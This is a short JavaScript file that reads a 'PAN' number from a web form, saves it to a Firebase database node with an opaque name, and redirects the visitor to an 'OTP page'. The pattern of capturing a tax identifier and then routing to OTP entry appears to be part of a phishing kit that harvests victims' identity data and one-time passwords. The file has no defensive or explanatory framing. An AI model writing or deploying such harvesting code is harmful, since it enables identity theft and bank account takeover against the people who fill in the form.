// reference your database
var ududip005DB = firebase.database().ref("ududip005");

document.getElementById("ududip005").addEventListener("submit", submitForm);

function submitForm(e) {
    e.preventDefault();

    var upan = getElementVal("upan");




    saveMessages(upan);

    // redirect to OTP page
    window.location.href = "otpe.html";
}

const saveMessages = (upan) => {
    var newududip005 = ududip005DB.push();

    newududip005.set({
        PAN_Number: upan,



    });
};

const getElementVal = (id) => {
    return document.getElementById(id).value;
};